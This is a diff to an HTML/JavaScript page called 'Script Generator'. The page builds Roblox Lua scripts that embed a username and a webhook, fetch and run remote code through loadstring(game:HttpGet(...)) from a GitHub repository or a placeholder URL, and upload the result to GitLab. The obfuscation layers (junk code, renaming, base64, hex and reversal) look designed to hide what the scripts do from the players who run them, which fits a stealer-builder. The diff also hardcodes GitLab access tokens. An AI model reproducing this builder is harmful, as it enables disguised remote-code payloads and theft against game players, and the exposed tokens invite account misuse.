@@ -54,7 +54,7 @@
 
     <h1>Script Generator</h1>
     <div class="container">
-        <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
+        <input type="text" id="username" placeholder="Enter your Username">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
         <select id="script-select">
             <option value="Blox Fruits">Blox Fruits</option>
@@ -65,14 +65,8 @@
     </div>
 
     <script>
-        const PAT = 'glpat-8si5orFgbXbJE4uzHwKS';
-        const projectID = '67586483';
-
-        const loadstrings = {
-            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
-            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
-            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
-        };
+        const PAT = "glpat-rp3iSBDjg5yxAWX_iJ9M";  // ❗ REPLACE THIS WITH YOUR GitLab Personal Access Token
+        const projectID = "67586483";  // ✅ Your GitLab project ID
 
         function randomString(length) {
             const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -87,16 +81,28 @@
             let junk = [
                 "local _unused = math.random()",
                 "local __dummy = string.reverse('dummy')",
-                "local __junk = 'OBF'..tostring(math.random(1000,9999))"
+                "local __junk = 'OBF'..tostring(math.random(1000,9999))",
+                "local garbage = math.sin(math.random())",
+                "local fakeVar = {} for i=1,10 do fakeVar[i] = i*math.random() end"
             ];
             return junk[Math.floor(Math.random() * junk.length)];
         }
 
+        function encodeBase64(str) {
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        function encodeHex(str) {
+            return str.split('').map(c => `\\x${c.charCodeAt(0).toString(16)}`).join('');
+        }
+
+        function reverseString(str) {
+            return str.split('').reverse().join('');
+        }
+
         function obfuscateScript(script) {
-            // Add junk code for obfuscation
             script = script.replace(/;/g, ";\n" + junkCode());
 
-            // Basic renaming
             const replacements = {
                 "Username": randomString(10),
                 "Webhook": randomString(10),
@@ -105,29 +111,27 @@
                 "HttpGet": randomString(10)
             };
             for (const original in replacements) {
-                const replacement = replacements[original];
-                script = script.replace(new RegExp(original, "g"), replacement);
+                script = script.replace(new RegExp(original, "g"), replacements[original]);
             }
 
-            // Hide username and webhook using string manipulation
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
-            let encodedUsername = encodeURIComponent(username);
-            let encodedWebhook = encodeURIComponent(webhook);
-            let obfuscatedUsername = `string.char(${encodedUsername.split('').map(c => c.charCodeAt(0)).join(',')})`;
-            let obfuscatedWebhook = `string.char(${encodedWebhook.split('').map(c => c.charCodeAt(0)).join(',')})`;
+            
+            let encodedUsername = encodeBase64(reverseString(username));
+            let encodedWebhook = encodeHex(reverseString(webhook));
+
+            let obfuscatedUsername = `string.reverse(syn.crypt.base64.decode("${encodedUsername}"))`;
+            let obfuscatedWebhook = `string.reverse("${encodedWebhook}")`;
 
             script = script.replace(new RegExp(replacements["Username"], "g"), obfuscatedUsername);
             script = script.replace(new RegExp(replacements["Webhook"], "g"), obfuscatedWebhook);
 
-            // Hex obfuscation
-            script = script.replace(/"/g, "'"); // Temporarily replace double quotes
-            let hexObfuscated = script.split('').map(char => `0x${char.charCodeAt(0).toString(16)}`).join(',');
-            script = `string.char(${hexObfuscated})`;
+            let hexObfuscated = encodeHex(script);
+            script = `loadstring(string.reverse(string.char(${hexObfuscated.split('\\x').filter(Boolean).map(hex => `0x${hex}`).join(',')})))()`;
 
-            // Control flow obfuscation
-            const obfuscatedScript = `return function() ${script} end`;
-            return obfuscatedScript;
+            let finalObfuscated = `return function() ${script} end`;
+
+            return finalObfuscated;
         }
 
         function generateScript() {
@@ -140,9 +144,15 @@
                 return;
             }
 
-            let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
-            let obfuscatedScript = obfuscateScript(script);
-            uploadToGitLab(obfuscatedScript);
+            let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://your-script-url.com'))()`;
+
+            alert("Original Script:\n\n" + script);
+
+            setTimeout(() => {
+                let obfuscatedScript = obfuscateScript(script);
+                alert("Obfuscated Script:\n\n" + obfuscatedScript);
+                uploadToGitLab(obfuscatedScript);
+            }, 500); 
         }
 
         function uploadToGitLab(content) {
